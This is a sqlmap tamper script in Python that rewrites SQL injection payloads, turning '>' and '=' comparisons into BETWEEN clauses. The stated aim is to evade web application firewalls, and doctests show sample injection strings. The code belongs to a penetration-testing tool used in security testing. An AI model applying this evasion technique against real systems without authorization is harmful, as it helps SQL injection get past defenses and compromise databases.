#!/usr/bin/env python

"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #'
    Replaces equals operator ('=') with 'BETWEEN # AND #'

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass weak and bespoke web application firewalls that
          filter the greater than character
        * The BETWEEN clause is SQL standard. Hence, this tamper script
          should work against all (?) databases

    >>> tamper('1 AND A > B--')
    '1 AND A NOT BETWEEN 0 AND B--'
    >>> tamper('1 AND A = B--')
    '1 AND A BETWEEN B AND B--'
    """

    retVal = payload

    if payload:
        match = re.search(r"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^>]+?)\s*>\s*([^>]+)\s*\Z", payload)

        if match:
            _ = "%s %s NOT BETWEEN 0 AND %s" % (match.group(2), match.group(4), match.group(5))
            retVal = retVal.replace(match.group(0), _)
        else:
            retVal = re.sub(r"\s*>\s*(\d+|'[^']+'|\w+\(\d+\))", " NOT BETWEEN 0 AND \g<1>", payload)

        if retVal == payload:
            match = re.search(r"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^=]+?)\s*=\s*(\w+)\s*", payload)

            if match:
                _ = "%s %s BETWEEN %s AND %s" % (match.group(2), match.group(4), match.group(5), match.group(5))
                retVal = retVal.replace(match.group(0), _)


    return retVal
